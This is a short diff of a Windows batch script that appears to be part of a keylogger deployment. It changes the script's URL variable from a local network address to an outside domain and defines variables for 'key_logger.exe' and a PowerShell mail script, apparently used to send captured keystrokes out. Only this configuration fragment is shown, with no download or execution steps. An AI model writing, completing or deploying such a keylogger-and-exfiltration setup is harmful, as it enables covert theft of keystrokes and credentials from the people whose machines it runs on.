@@ -1,7 +1,7 @@
 @echo off
 setlocal
 
-set "URL=http://192.168.101.2:80"
+set "URL=https://jitenadk.me"
 
 set "logger=key_logger.exe"
 set "mail=ps_mail.ps1"
